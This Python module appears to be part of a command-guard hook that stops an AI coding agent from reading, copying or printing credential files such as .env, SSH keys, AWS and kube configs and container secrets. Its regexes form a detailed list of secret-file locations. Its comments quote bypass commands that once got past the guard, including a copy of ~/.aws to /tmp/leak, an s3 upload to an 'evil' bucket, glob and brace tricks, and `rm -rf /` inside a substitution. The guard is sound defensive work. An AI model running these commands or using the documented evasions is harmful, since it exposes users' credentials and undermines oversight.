#!/usr/bin/env python3
"""Secret-file classification and the command rules over it."""
import re

from guard_parse import (
    GLOBBED,
    _brace_fragments,
    blank_inert_heredocs,
    brace_expand,
    normalize_path,
    tokens,
)

# See guard_git.MIDDLE_SIGNALS for why these live next to the rules.
MIDDLE_SIGNALS = (
    r"(^|[\s'\"=/(])\.env(?![\w-])",
    r"\.(ssh|aws|kube|gnupg|docker)/",
    r"id_(rsa|ed25519|ecdsa|dsa)",
    r"\.(netrc|pgpass|npmrc|pypirc|git-credentials)\b",
    r"\.(pem|p12|pfx|jks|keystore)\b",
    r"\bcredentials\.json\b",
    r"\bsecrets\.(ya?ml|json|toml)\b",
)

# One wording for every secret-read block in this module. Three call sites had
# their own copy of it and the copies were already drifting apart.
SECRET_FIX = ("use the .example variant for variable names; never read, copy, "
              "or print the real values")

SAFE_SUFFIX = re.compile(r"\.(example|sample|template|dist|tpl)$", re.I)

ENVISH = re.compile(r"(^|/)\.env(\.[\w.-]+)?$", re.I)

SECRET_FILE = re.compile(
    r"(^|/)(\.env(\.[\w.-]+)?"
    r"|\.envrc"
    r"|secrets?\.(ya?ml|json|toml)"
    r"|credentials\.json"
    r"|\.netrc|\.pgpass|\.git-credentials|\.terraformrc"
    # The XDG home for the same file git writes to `~/.git-credentials`. One
    # spelling was covered and the other was not, so `cat ~/.config/git/
    # credentials` read the identical secret straight through. An agent
    # debugging a push failure lands on it naturally.
    r"|\.config/git/credentials"
    # Application Default Credentials: what `gcloud auth application-default
    # login` writes, and the first thing anyone opens when GCP auth misbehaves.
    r"|\.config/gcloud/application_default_credentials\.json"
    # `.env` was anchored to the start of a filename, so `secrets.env` and
    # `config/production.env` were not env files as far as this was concerned.
    r"|[\w.-]*\.env"
    r"|\.config/gh/hosts\.yml|\.config/gcloud/credentials\.db"
    r"|\.config/rclone/rclone\.conf|\.gem/credentials|\.cargo/credentials(\.toml)?"
    r"|serviceaccount(-[\w.-]+)?\.json|firebase-adminsdk[\w.-]*\.json"
    r"|id_(rsa|ed25519|ecdsa)"
    # Bare-directory forms matter as much as the filenames: `cp -r ~/.aws
    # /tmp/leak` names no file at all and was allowed while `cat
    # ~/.aws/credentials` was blocked.
    r"|\.aws(/(credentials|config))?"
    r"|\.kube(/config)?"
    r"|\.docker(/config\.json)?"
    r"|\.gnupg(/[\w.-]+)?"
    # authorized_keys is not a secret to read, but writing it grants login, so
    # it belongs on the same list as the rest of ~/.ssh.
    r"|\.ssh(/(id_[\w-]+|config|known_hosts|authorized_keys))?"
    r"|\.npmrc|\.pypirc"
    r"|.*\.(p12|pfx|keystore|jks))$",
    re.I,
)

# Anchored on the basename and bounded on both sides. The previous form
# `[\w.-]*(kw)[\w.-]*\.key$` was quadratic: `cat api.api.api...z` took 5s at
# 20k repeats, past the hook timeout.
KEYISH = re.compile(
    r"(^|/)[^/]{0,120}(private|secret|priv|signing|master|api|deploy)[^/]{0,120}\.key$", re.I)

# Any .pem is treated as key material. The well-known PUBLIC names are exempted
# by PUBLIC_CERT below, which is what keeps `curl --cacert /etc/ssl/cert.pem`
# working. An unrecognised `server.pem` is more often a private key than not.
PEMISH = re.compile(r"(^|/)[^/]{0,120}\.pem$", re.I)

# Public trust stores and published certs are not secrets. Without this,
# `curl --cacert /etc/ssl/cert.pem` is blocked, which is a daily command.
PUBLIC_CERT = re.compile(
    r"(^|/)(ca|ca-bundle|ca-certificates|cacert|cert|chain|fullchain)\.(pem|crt|cer)$"
    r"|^/etc/(ssl|pki)/|^/usr/(share|local/share)/ca", re.I)

# Directories that hold nothing but credentials. A glob anywhere under one of
# them is a read whatever the rest of the name looks like, which is what
# `cat ~/.aws/*` and `cat ~/.aws/cred*` need: the glob truncates the filename,
# so no list of filenames can ever match them.
# The dot-directories in a home, plus the mounts a container gets its
# secrets through. Only the first group was here, so every credential an
# agent meets while running inside a container was readable: /run/secrets
# is where Docker and Compose put them and where Kubernetes mounts a
# service-account token.
SECRET_DIR = re.compile(
    r"(^|/)\.(ssh|aws|kube|docker|gnupg)/"
    # With or without the trailing slash: naming the directory is how a
    # recursive read reaches everything inside it. `ls` stays exempt via
    # METADATA_ONLY, because listing names discloses nothing.
    r"|^(/var)?/run/secrets(/|$)", re.I)

# Inside a credential directory but not credentials. READ-safe only: writing
# an ssh config installs a ProxyCommand, which runs on the next connection.
# Exact paths, not a pattern over `config`: ~/.kube/config holds bearer tokens
# and ~/.docker/config.json holds registry auth.
READ_SAFE_SECRET = re.compile(
    r"(^|/)\.ssh/(config|known_hosts(\.old)?)$"
    r"|(^|/)\.aws/config$", re.I)

# The exemption applies to these and nothing else.
PURE_READER = re.compile(
    r"^\s*\S*(cat|bat|less|more|head|tail|grep|rg|ag|egrep|fgrep|diff|wc|awk)\b")

# Trailing shell noise on an otherwise clean path: `cat .env*`, `cat .env#`.
GLOB_TRAIL = re.compile(r"[*?\[\]{}#,]+$")

GLOB_LEAD = re.compile(r"^[*?\[\]{}]+")

# Characters that cannot appear inside a path here, used to pull path-shaped
# runs out of text that shlex cannot be trusted to tokenise: quoted inner
# commands, command substitutions, `bash -c '...'`.
CANDIDATE_SPLIT = re.compile(r"""[\s'"=()<>`$;|&!,]+""")

# A cap so a pathological payload cannot turn the scan into the slow path. The
# hook has a 5 second timeout and a timeout fails open.
MAX_CANDIDATES = 4000

MAX_SUBSTITUTIONS = 500

# A copy of a secret is a secret. `cat ~/.ssh/id_rsa.bak` and
# `cat ~/.aws/credentials.old` were both allowed.
BACKUP_SUFFIX = re.compile(r"\.(bak|old|orig|save|backup|copy|[0-9]+)$", re.I)

def _is_secret_path(p):
    if SAFE_SUFFIX.search(p) or PUBLIC_CERT.search(p):
        return False
    stripped = BACKUP_SUFFIX.sub("", p)
    if stripped != p and not SAFE_SUFFIX.search(stripped) \
            and not PUBLIC_CERT.search(stripped) and _is_secret_path(stripped):
        return True
    # Anything inside a credentials-only directory, whatever it is called.
    # This was consulted only for globbed paths, so `cat ~/.ssh/deploy_key`
    # was allowed: the name matches no pattern, because KEYISH wants a `.key`
    # extension and a deploy key has none. The directory is the fact that
    # matters, and READ_SAFE_SECRET carries the handful of exceptions.
    # `.pub` is the one thing in `~/.ssh` that is meant to be handed out, and
    # `gh ssh-key add ~/.ssh/id_ed25519.pub` is ordinary setup.
    if SECRET_DIR.search(p) and not READ_SAFE_SECRET.search(p) \
            and not p.endswith(".pub"):
        return True
    return bool(ENVISH.search(p) or SECRET_FILE.search(p) or KEYISH.search(p) or PEMISH.search(p))


# Credential filenames a glob can truncate. `cat .env*` was handled by
# trimming the `*`, but `cat .en*` leaves `.en`, which matches nothing and was
# allowed while expanding to exactly the same file.
_TRUNCATABLE = (".env", ".envrc", ".netrc", ".pgpass", ".git-credentials",
                "credentials", "credentials.json", "id_rsa", "id_ed25519",
                "secrets.yaml", "secrets.yml", "secrets.json")


def _is_truncated_secret(stem):
    """Is this glob stem a prefix of a credential filename?

    Bounded on purpose: a prefix of at least three characters, against a fixed
    list. Shorter would make `c*` a credential and refuse most of the shell.
    """
    name = stem.rsplit("/", 1)[-1]
    if len(name) < 3:
        return False
    return any(n.startswith(name) and n != name for n in _TRUNCATABLE)

# curl and friends name a file to UPLOAD with a leading `@`: `-d @.env`,
# `-F key=@id_rsa`, `--data-binary @creds.json`. The `@` is syntax, not part of
# the path, and leaving it on meant no path rule matched.
UPLOAD_AT = re.compile(r"^[^=]*=?@(?=.)")

def is_secret_candidate(tok):
    """_is_secret_path, but tolerant of globs and trailing shell noise.

    The strict test is anchored on the end of the path, so anything that eats
    or extends the filename slips past it: `cat .env*`, `cat ~/.ssh/id_rsa#`,
    `cat ~/.aws/cred*`. Every loose check in this file goes through here, so
    the class list and the .example / public-cert exemptions cannot drift.
    """
    tok = UPLOAD_AT.sub("", tok, count=1)
    # A brace list is one shlex token but several real paths. Judge each.
    # NOT recursively: brace_expand gives up past its limit, and re-entering
    # here with a still-braced part recursed until the stack blew.
    if "{" in tok and "}" in tok:
        for part in brace_expand(tok):
            if "{" in part or "}" in part:
                # Past the expansion limit. Concatenating the members is NOT a
                # superset of them: it builds a path that matches nothing, and
                # `~/{.aws/credentials,z}` was allowed as a result. Judge each
                # comma-separated fragment against the surrounding text instead.
                # Strictly smaller and brace-free, or we do not recurse.
                # This is the second guard on the same hazard: the first is in
                # _brace_fragments, and neither is redundant, because the cost
                # of getting it wrong is a hang rather than a wrong verdict.
                if any(is_secret_candidate(f) for f in _brace_fragments(part)
                       if len(f) < len(part) and "{" not in f and "}" not in f):
                    return True
                continue
            if part != tok and is_secret_candidate(part):
                return True
        return False
    p = normalize_path(tok)
    if len(p) > 512:
        p = p[-512:]
    if _is_secret_path(p):
        return True
    # Trim shell noise off both ends. Trailing catches `cat .env*` and
    # `cat ~/.ssh/id_rsa#`; leading catches `head -20 *.env`, where the glob
    # sits exactly where the anchor expects a `/`.
    stem = GLOB_LEAD.sub("", GLOB_TRAIL.sub("", p))
    if stem and stem != p and _is_secret_path(stem):
        return True
    if stem and stem != p and _is_truncated_secret(stem):
        return True
    if not GLOBBED.search(p):
        return False
    # A public key is not a secret, and `cat ~/.ssh/*.pub` is a real command.
    if p.endswith(".pub"):
        return False
    # The glob ate the filename outright, so no list of names can match it.
    # Anything under a credentials-only directory is a read regardless.
    return bool(SECRET_DIR.search(p))

# Copying a template INTO place is setup, not exfiltration, and `cp
# .env.example .env` is the single most common first step in any repo. Reading
# the real file is still caught: that is a different command.
# `cat .env.example > .env` is the redirect spelling of the same setup step,
# and it was blocked while the `cp` spelling was allowed.
SAFE_COPY = re.compile(r"^\s*(cp|mv|install|cat)\b")

# Every exemption below is ^-anchored on the head, so ONE package-runner prefix
# defeated all of them at once: `dotenv -e .env -- npm run dev` is pinned as
# allowed, and `npx dotenv -e .env -- npm run dev`, which is how people
# actually type it, was refused.
#
# Stripped here and nowhere else, deliberately. These do NOT go in WRAPPERS:
# that list is stripped for every rule, and it would take `npm` off the front
# of `npm publish`, which the publish rule is anchored on. A prefix that is
# inert for one rule is load-bearing for another.
PKG_RUNNER = re.compile(
    r"^\s*(npx|pnpx|bunx"
    r"|(pnpm|yarn|bun)\s+(exec|dlx|run)"
    r"|(uv|poetry|pipenv|rye|hatch|pdm)\s+run)\s+")

SSH_KEYGEN = re.compile(r"^\s*ssh-keygen\b")

# A key passed as an identity flag is used for authentication, never printed.
# Blocking `ssh -i ~/.ssh/id_ed25519 host` is pure nuisance.
# NOTE: git is deliberately absent. `git commit -i` means --include, not an
# identity file, and including it exempted `git commit -i .env -m x`.
# No GIT_SSH_COMMAND= alternative: segments() strips KEY=value prefixes before
# this is matched, so it could never fire.
SSH_IDENTITY = re.compile(r"^\s*(ssh|scp|sftp|ssh-add|ssh-copy-id)\b")

# Taking a key path IS the whole purpose of these two, so they are exempt
# outright rather than only for the token an identity flag consumes.
SSH_KEY_TOOL = re.compile(r"^\s*(ssh-add|ssh-copy-id)\b")

# `test -f .env` asks whether a file exists; it never reads the contents.
# The double-bracket form is bash's, and `test ! -f X` is the negated one.
# Matching only the single bracket blocked both, and the double is the
# commoner spelling in a script.
EXISTENCE_TEST = re.compile(r"^\s*(test|\[\[?)\s+(!\s+)?-[efdrswx]\b")

# Metadata-only operations. They never read contents.
METADATA_ONLY = re.compile(r"^\s*(ls|stat|chmod|chown|mkdir|touch|file|wc|find)\b")

# Naming a secret file is not disclosing it. These heads delete it, ask git
# about it, or hand it to the user's own editor. None of them put the contents
# anywhere the agent or a transcript can see, which is what this rule exists to
# stop. Refusing them taught nobody anything and cost a lot: `rm .env.local`,
# `git rm --cached .env` (the standard remediation for a secret that reached a
# commit) and `vim .env` are daily, and the fix line they printed, "use the
# .example variant for variable names", is not advice for any of them.
#
# `git add` is deliberately NOT here. Staging a real .env is precisely how a
# secret gets into a commit, so that one goes on being refused.
#
# `git diff`, `git show` and `git log -p` are deliberately NOT here either.
# They PRINT the contents, which is the same act as `cat` with extra steps.
NON_DISCLOSING = re.compile(
    r"^\s*("
    r"rm|unlink|shred|rmdir"
    r"|vi|vim|nvim|nano|emacs|micro|hx|helix|pico|code|codium|subl|open"
    r"|direnv"
    r"|git\s+(check-ignore|status|ls-files|rm)"
    r")\b")

# A find that RUNS something is not metadata-only: it can cat, copy, or delete
# whatever it matched. `find . -name .env -exec cat {} +` read every one.
FIND_ACTS = re.compile(r"\s-(exec|execdir|ok|okdir|delete|fprint|fprintf|fls)\b")

# An exclusion PATTERN names what not to touch, which is the opposite of a
# read. Only for tools that actually have exclusion flags: applying it
# everywhere turned `cp -x <secret> /tmp/leak` into an allowed command.
# `(\S*/)?`, not `\S*`: the loose form let `mytar` and `gzip` inherit an
# exemption meant for `tar` and `zip`. A path prefix is still fine.
EXCLUDES_CAPABLE = re.compile(
    r"^\s*(\S*/)?(rsync|tar|grep|rg|ag|ack|find|zip|aws|gsutil|rclone|diff)\b")

# `-x PATTERN` is a genuine exclusion flag for diff and for zip. No other tool
# in the list uses -x that way, and `cp -x` means something else entirely, so it
# is admitted for these two only.
# Anchored the same way, and deliberately redundant with it: `gzip -x <secret>`
# needs BOTH of these loosened before it is exempt, so mutating either one
# alone leaves the hole shut. That is why no single test can pin either one.
EXCLUDE_X_CAPABLE = re.compile(r"^\s*(\S*/)?(diff|zip)\b")

EXCLUDE_FLAG = re.compile(r"^--(exclude|ignore|exclude-from|exclude-tag)(=|$)")

# Flags whose VALUE names a credential to authenticate WITH rather than a file
# to print are built per-command in check_secrets_cmd. There is no separate
# pattern for the `--flag=value` spelling: a second list of the same flag names
# is what let the two forms disagree about which command takes which flag.

def _substitution_bodies(seg, quote_aware=True):
    """The contents of every `$(...)` and backtick run, nesting included.

    A non-recursive regex could not span an inner substitution, so
    `echo "$(cat $(pwd)/.env)"` produced no body at all and read the file.

    SINGLE-QUOTED regions are skipped. A POSIX shell preserves every
    character inside '...' literally, so a substitution written there is
    text and can never run. Scanning it anyway refused ordinary work:
    writing documentation ABOUT a dangerous command was treated as running
    it, which is how `git commit -m 'docs: why <force push> is refused'`
    came back BLOCKED. Double quotes DO expand, so they are still scanned:
    `echo "Deleted: $(rm -rf /tmp/build)"` really does run the rm.

    If the single quotes do not balance, the scan is redone quote-blind.
    One stray apostrophe must not be able to hide a live substitution
    behind it, as in `echo don't $(rm -rf /)`.
    """
    out, i, n = [], 0, len(seg)
    in_single = in_double = False
    while i < n and len(out) < MAX_SUBSTITUTIONS:
        if quote_aware and in_single:
            # No escape character exists inside single quotes, so the very
            # next quote ends the run.
            if seg[i] == "'":
                in_single = False
            i += 1
            continue
        if quote_aware and seg[i] == "'" and not in_double:
            in_single = True
            i += 1
            continue
        if quote_aware and seg[i] == '"':
            in_double = not in_double
            i += 1
            continue
        if seg.startswith("$(", i):
            depth, j = 1, i + 2
            while j < n and depth:
                if seg[j] == "(":
                    depth += 1
                elif seg[j] == ")":
                    depth -= 1
                j += 1
            # An unterminated substitution is still worth scanning: take the
            # rest of the segment rather than dropping it silently.
            out.append(seg[i + 2:j - 1 if depth == 0 else n])
            i = j
        elif seg[i] == "`":
            j = seg.find("`", i + 1)
            if j == -1:
                out.append(seg[i + 1:])
                break
            out.append(seg[i + 1:j])
            i = j + 1
        else:
            i += 1
    # Ending inside a single-quoted run means the quotes never closed, so the
    # skipping above was guesswork. Redo it quote-blind rather than let one
    # stray apostrophe swallow a live substitution: `echo don't $(rm -rf /)`
    # is not valid shell, but a parser that hides the rm is the wrong way to
    # be wrong about it.
    if quote_aware and in_single:
        return _substitution_bodies(seg, quote_aware=False)
    return out

def check_substitutions(seg):
    """Scan the CONTENTS of `$(...)` and backticks for secret reads.

    Only the contents. Flattening the whole segment made any quoted mention of
    a secret trip whenever a substitution appeared elsewhere on the line, which
    blocked `gh pr create --body "... $(date)"`.
    """
    inner = " ".join(_substitution_bodies(seg))
    if not inner.strip():
        return None
    # A heredoc body inside a substitution is content, not a command.
    inner = blank_inert_heredocs(inner)
    for tok in CANDIDATE_SPLIT.split(inner)[:MAX_CANDIDATES]:
        if tok and is_secret_candidate(tok):
            return (f"a command substitution reading '{tok}', which holds live secrets.",
                    SECRET_FIX)
    return None

# A tool whose first non-flag operand is the PATTERN, not a path to read.
#
# EXCLUDES sed and awk on purpose, and guard_parse.PATTERN_TAKING_TOOL includes
# them: `sed -n 1p <secret>` and `awk 1 <secret>` print the file, so exempting
# their first operand would exempt the read. The old comment here claimed this
# was defined locally to avoid importing from guard_db, which was doubly wrong.
# The pattern it meant lives in guard_parse, which this module already imports
# from, and the real reason to keep two is that they answer different
# questions. They shared the name SEARCHER, so the facade exported whichever
# module the star imports reached last.
PATTERN_FIRST_OPERAND = re.compile(r"^\s*\S*(grep|rg|ag|ack|fgrep|egrep|rga)\b")


def _read_safe(head, seg, tok):
    """Pure reader, no redirect anywhere, path on the allowlist. All three:
    `cat x > ~/.ssh/config` names the path in a WRITE position."""
    if ">" in seg:
        return False
    if not PURE_READER.match(head):
        return False
    return bool(READ_SAFE_SECRET.search(normalize_path(tok)))

def check_secrets_cmd(seg, loose=True, piped=False, stripped=None):
    """`stripped` is the segment with wrapper words removed.

    Every exemption below is `^`-anchored on the command name, and the caller
    passes the RAW text so the scans can see inline `KEY=value` prefixes. Those
    two needs conflict: `if [ -f .env ]; then` reaches here as
    `if [ -f .env ]`, where EXISTENCE_TEST cannot match, so the commonest
    conditional idiom in shell was blocked.
    """
    head = seg if stripped is None else stripped
    # See PKG_RUNNER: the runner is not the command, and every test
    # below is asking what the command is.
    head = PKG_RUNNER.sub("", head)
    if SSH_KEYGEN.match(head) or EXISTENCE_TEST.match(head) or SSH_KEY_TOOL.match(head):
        return None
    # Which flags name a credential to authenticate WITH on THIS command.
    # A config named as the connection to use is not a file being printed. It
    # is per-command: `-i` means an identity file to ssh and an include path to
    # rsync, and `git commit -i .env` means --include.
    identity_flags = set()
    if re.match(r"^\s*(kubectl|helm|k9s|aws|gcloud|az|docker)\b", head):
        identity_flags |= {"--kubeconfig", "--config", "--config-file"}
    # A dotenv file handed to a runtime to LOAD is configuration, not output.
    # `docker compose --env-file .env up -d` is how the tool is meant to
    # be used and discloses nothing. Same argument as --kubeconfig above.
    if re.match(r"^\s*(docker|docker-compose|podman|dotenv|nx|turbo|pm2)\b", head):
        identity_flags |= {"--env-file", "--env_file", "-e", "--environment"}
    if SSH_IDENTITY.match(head):
        identity_flags |= {"-i", "-F", "--identity", "--identity-file"}
    # A CA bundle named as the trust store to verify WITH is public by role,
    # whatever it is called. PUBLIC_CERT allowlists filenames and its own
    # comment says the exemption exists to keep `--cacert` working, but a
    # corporate bundle is not named ca.pem. NOT --cert or --key: those name a
    # CLIENT certificate, which does come with private key material.
    if re.match(r"^\s*(curl|wget)\b", head):
        identity_flags |= {"--cacert", "--capath",
                           "--ca-certificate", "--ca-directory"}
        # NOT --cert or --key. Those name a client certificate and its private
        # half, which is key material. --cert already blocked because its value
        # looks like a key path; --key did not, and one blocking while the other
        # does not is the inconsistency worth closing.
        for flag in ("--key", "--cert"):
            identity_flags.discard(flag)
    if METADATA_ONLY.match(head) and not FIND_ACTS.search(seg) and not piped:
        return None
    # Same bargain as METADATA_ONLY above, `not piped` included: `piped` means
    # this segment feeds a CONTENT reader, and a head that discloses nothing on
    # its own is a different question once its output is being read.
    if NON_DISCLOSING.match(head) and not piped:
        return None
    # A searcher's first non-flag operand is its PATTERN. `ls -la | grep .env`
    # reads no file at all, and blocking it taught the agent that looking for
    # the string is the same act as reading the file. Later operands ARE files,
    # so `grep KEY .env` still blocks.
    search_pattern = None
    if PATTERN_FIRST_OPERAND.match(head):
        for tok in tokens(seg)[1:]:
            if tok.startswith("-"):
                continue
            search_pattern = tok
            break
    if SAFE_COPY.match(head):
        # Redirects are not operands. `cat .env.example > .env` put `>` in the
        # source position and lost the template check.
        args = [normalize_path(x) for x in tokens(seg)[1:]
                if not x.startswith("-") and x not in (">", ">>", "<", "|")]
        # Source -> destination, where the SOURCE is a template. Judge the last
        # two so a flag value (`install -m 600 ...`) does not break it. Any
        # other shape, or a secret in a source position, is a copy OUT.
        # The destination matters too. Only an `.env`-family destination is
        # exempt, because that is the file the template exists FOR. Writing a
        # template over somebody's credential STORE is a different act:
        # `cat foo.example > ~/.ssh/authorized_keys` installs an SSH login key,
        # and the README promises writes are blocked whatever tool does
        # them.
        if len(args) >= 2 and SAFE_SUFFIX.search(args[-2]) \
                and not any(_is_secret_path(a) for a in args[:-1]) \
                and (ENVISH.search(args[-1]) or not _is_secret_path(args[-1])):
            return None
    toks = tokens(seg)
    for i, tok in enumerate(toks):
        p = normalize_path(tok)
        if len(p) > 512:
            p = p[-512:]
        # By POSITION, not by value. Exempting the value everywhere it appeared
        # meant `aws --config <secret> s3 cp <secret> s3://evil/` read it under
        # cover of the flag. Only the token the flag actually consumes is
        # exempt, plus the `--flag=value` token itself.
        if i and toks[i - 1] in identity_flags:
            continue
        # The `--flag=value` form, exempt on the same terms as the spaced form
        # above: the flag has to be one THIS command takes. Testing that the
        # set was merely non-empty handed every identity flag to any command
        # that earned one, so `docker --identity-file=<key>` and
        # `pm2 --config=<credentials>` read a secret under cover of a flag
        # neither tool has.
        if "=" in tok and tok.split("=", 1)[0] in identity_flags:
            continue
        # the value of an exclude flag, in either `--exclude=X` or `--exclude X`
        if EXCLUDES_CAPABLE.match(head) and (
                EXCLUDE_FLAG.match(tok)
                # Only the SPACED form has its value in the next token.
                # `--exclude=X` already consumed it, and exempting what follows
                # let `tar --exclude=.cache ~/.ssh` read the key.
                or (i and EXCLUDE_FLAG.match(toks[i - 1]) and "=" not in toks[i - 1])
                or (i and toks[i - 1] == "-x" and EXCLUDE_X_CAPABLE.match(head))):
            continue
        # is_secret_candidate, not _is_secret_path: a globbed operand is a file
        # list rather than a clean path, and `grep -r pw ~/.pgpass*` slipped
        # past the strict test while the exact form blocked.
        if is_secret_candidate(tok):
            if _read_safe(head, seg, tok):
                continue
            if search_pattern is not None and tok == search_pattern:
                continue        # the pattern being searched for, not a file
            return (f"a command touching '{tok}', which holds live secrets.",
                    SECRET_FIX)
    # A command substitution collapses into ONE shlex token, so its inner
    # paths never reach the loop above. Re-scan with the substitution syntax
    # flattened: `echo "$(cat <secret>)"` really does read the file.
    # Catches shapes that are not clean tokens: bash -c '...', globs, trailing #.
    loose_seg = seg
    if EXCLUDES_CAPABLE.match(head):
        loose_seg = re.sub(r"--(exclude|ignore|exclude-from|exclude-tag)(=|\s+)\S+", " ", seg)
    if EXCLUDE_X_CAPABLE.match(head):
        # The token loop admits `-x <pattern>`; the loose scan has to admit it
        # too, or `diff -x .env -r a b` blocks despite the exemption.
        loose_seg = re.sub(r"(^|\s)-x(=|\s+)\S+", " ", loose_seg)
    # The flag AND the value it consumes, as one unit. A blanket
    # `loose_seg.replace(<value>, " ")` also erased every OTHER mention of the
    # same path on the line, which is how `aws --config <secret> s3 cp
    # <secret> s3://evil/` got through.
    # DERIVED from identity_flags, not a second hand-kept list. The two
    # disagreed: a flag added to the set above was still re-caught here, so the
    # exemption did nothing and the loose rescan silently overruled the token
    # loop. Building the pattern from the set is what makes one edit enough.
    if identity_flags:
        loose_seg = re.sub(
            r"(^|\s)(" + "|".join(re.escape(f) for f in sorted(identity_flags))
            + r")(=|\s+)\S+", " ", loose_seg)
    if re.match(r"^\s*(dotenv|docker|docker-compose|podman|pm2)\b", head):
        # `dotenv -e <file> -- npm run dev`: the short spelling of the same
        # flag. Scoped to these runtimes, because `-e` means something else
        # almost everywhere: a pattern to grep, a program to perl, errexit to
        # a shell.
        loose_seg = re.sub(r"(^|\s)-e(=|\s+)\S+", " ", loose_seg)
    if loose:
        for cand in CANDIDATE_SPLIT.split(loose_seg)[:MAX_CANDIDATES]:
            if cand and is_secret_candidate(cand):
                if _read_safe(head, seg, cand):
                    continue
                return (f"a command touching '{cand}', which holds live secrets.",
                        SECRET_FIX)
    return None
